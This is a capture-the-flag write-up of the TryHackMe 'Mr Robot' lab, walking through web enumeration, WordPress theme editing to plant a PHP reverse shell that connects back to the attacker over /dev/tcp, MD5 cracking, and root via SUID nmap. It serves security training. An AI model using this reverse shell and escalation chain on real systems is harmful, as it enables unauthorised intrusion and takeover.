# Mr Robot — TryHackMe

**Author:** Koushiq Murad
**Room:** Mr Robot (TryHackMe)
**Difficulty:** Medium
**Machine Type:** CTF / Linux

---

## Summary

This writeup documents the steps I used to fully compromise the **Mr Robot** TryHackMe machine: initial reconnaissance, web enumeration, credential discovery (base64 in `license` / `robots.txt`), WordPress exploitation by editing a theme page to upload a PHP reverse shell, initial user access, cracking a discovered MD5 hash to `robot` user credentials, and final privilege escalation by abusing an SUID `nmap` binary (GTFOBins technique) to obtain a root shell and capture the final key.

**Note:** Replace the placeholder flags below with the actual flags you captured while completing the room.

---

## Environment

- Lab provider: TryHackMe
- Target IP: `10.10.X.X` *(replace with the machine IP from your lab session)*
- Attacker machine: your Kali / local machine

---

## Tools used

`nmap`, `gobuster`/`feroxbuster`, `curl`, `base64` (or an online decoder), web browser (WordPress admin), `netcat` (nc), `ssh`, `john`/`hashcat`/online cracker (CrackStation), `linpeas`/`LinEnum` (optional), `getcap`, `find`, `gtfobins` technique notes.

---

## Recon / Enumeration

1. Initial TCP/service scan with service/version detection and default scripts:

```bash
nmap -sC -sV -p- -T4 -oA nmap/initial 10.10.X.X
```

2. Note interesting open ports (HTTP 80/443). If SSH appears closed in the quick scan, re-run targeted scans on common ports to confirm.

```bash
nmap -sC -sV -p22,80,443 -oA nmap/targeted 10.10.X.X
```

3. Directory/virtual path enumeration on the web server:

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 -o gobuster/root.txt
# or feroxbuster
# feroxbuster -u http://10.10.X.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50
```

From the gobuster output we found entries such as `/robots.txt`, `/license`, `/readme`, and `/wp-login.php`.

---

## Finding credentials (robots.txt / license)

1. Open `robots.txt`:

```bash
curl -sS http://10.10.X.X/robots.txt
```

2. The `robots.txt` pointed to a `license` (or other hidden file) that contained a Base64 string. Copy that and decode it locally:

```bash
# if the encoded string is in variable $B64
echo 'BASE64_STRING' | base64 -d
# or use an online Base64 decoder
```

3. The decoded text contained credentials, e.g.:
```
Elliot: <password_here>
```

---

## Accessing WordPress (Foothold)

1. Visit `http://10.10.X.X/wp-login.php` and log in using the credentials found in the previous step.
2. As the authenticated user, navigate to `Appearance -> Theme File Editor` (or `Pages -> Editor`) and find a theme template (e.g., `404.php`) that can be edited.
3. Replace or inject a PHP reverse shell payload (generate one from a site like `revshells` or use a simple PHP rev shell) into the editable page. Example minimal PHP reverse shell (use at your own discretion):

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"); ?>
```

4. On your attacker machine, start a netcat listener to catch the reverse shell:

```bash
nc -lvnp 9010
```

5. Trigger the modified page (e.g., visit `http://10.10.X.X/404.php`) to execute the PHP and get a shell back.

6. Upgrade the shell to a proper interactive TTY (Python upgrade):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl-z
stty raw -echo
fg
```

---

## User enumeration and credential harvesting

1. After gaining a shell, enumerate the filesystem. Common useful commands:

```bash
id
uname -a
pwd
ls -la
ps aux
cat /etc/passwd
```

2. Check the home directory for interesting files. In this room we found an MD5 hash stored in a file (e.g., `/home/robot/` or a saved password file). Export or copy the hash and attempt to crack it.

3. Fast crack option: try an online rainbow table (CrackStation) or use `john`/`hashcat`:

```bash
# example: use CrackStation or hash-identifier to confirm MD5
# with john (if you saved the hash to hash.txt):
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
```

4. In this walkthrough the MD5 hash cracked to a readable password (e.g., `atoz...`), which allowed `su robot`:

```bash
su robot
# paste cracked password
```

5. Once switched to `robot`, read the second key:

```bash
cat /home/robot/user.txt
# copy the second key into TryHackMe
```

---

## Privilege Escalation — abusing SUID `nmap` (GTFOBins technique)

1. Enumerate SUID/SGID files. Note: use the corrected `find` syntax (`/` for any bit). The deprecated `-perm +6000` is why some searches fail. Use:

```bash
sudo find / -type f -perm /6000 2>/dev/null | grep '/bin/'
```

2. Inspect unusual SUID binaries. In this machine `nmap` was present with the SUID bit set — an unusual configuration that can be abused.

3. Check GTFOBins entry for `nmap` and follow the shell trick. One working method is to invoke the interactive mode and then spawn a shell. Example:

```bash
# run nmap interactively and execute a shell
nmap --interactive
# at the nmap prompt (that appears), run:
!sh
# As this nmap is SUID root, the spawned sh will be a root shell.
whoami
# should print: root
```

4. Once root, read the final flag:

```bash
cat /root/root.txt
# copy final key into TryHackMe
```

---

## Flags

- **User flag:** `PLACEHOLDER_USER_FLAG`  *(replace with your `user.txt` content)*
- **Root flag:** `PLACEHOLDER_ROOT_FLAG`  *(replace with your `root.txt` content)*

---

## Commands summary (copy/paste)

```bash
# Host discovery & enumeration
nmap -sC -sV -p- -T4 -oA nmap/initial 10.10.X.X
nmap -sC -sV -p22,80,443 -oA nmap/targeted 10.10.X.X

# Web enumeration
gobuster dir -u http://10.10.X.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 -o gobuster/root.txt
curl -sS http://10.10.X.X/robots.txt

# decode base64
echo 'BASE64_STRING' | base64 -d

# start listener (on attacker)
nc -lvnp 9010

# after shell, upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# check for SUID/SGID
sudo find / -type f -perm /6000 2>/dev/null | grep '/bin/'

# abuse nmap if SUID
nmap --interactive
# then at the nmap prompt
!sh

# read flags
cat /home/robot/user.txt
cat /root/root.txt
```

---

## Lessons learned / Notes

- `-perm +6000` is deprecated on modern `find` implementations. Use `-perm /6000` to match files that have **any** of the setuid/setgid bits set, or `-perm -6000` to require **both**.
- Always inspect `robots.txt`, `license`, `readme`, and other low-hanging files discovered while gobuster-ing. They often contain keys, credentials, or pointers.
- WordPress editor access is a high-impact foothold if a theme or plugin file is editable — you can often insert server-side code to gain a shell.
- For quick hash checks try online rainbow databases (CrackStation) before spending time with heavy cracking.
- GTFOBins is indispensable for identifying abuse cases for binaries with elevated privileges.

---

## References

- TryHackMe — Mr Robot room
- GTFOBins — nmap SUID abuse methods
- CrackStation / John The Ripper — hash cracking
- PEASS-ng (linpeas) — local enumeration for privilege escalation


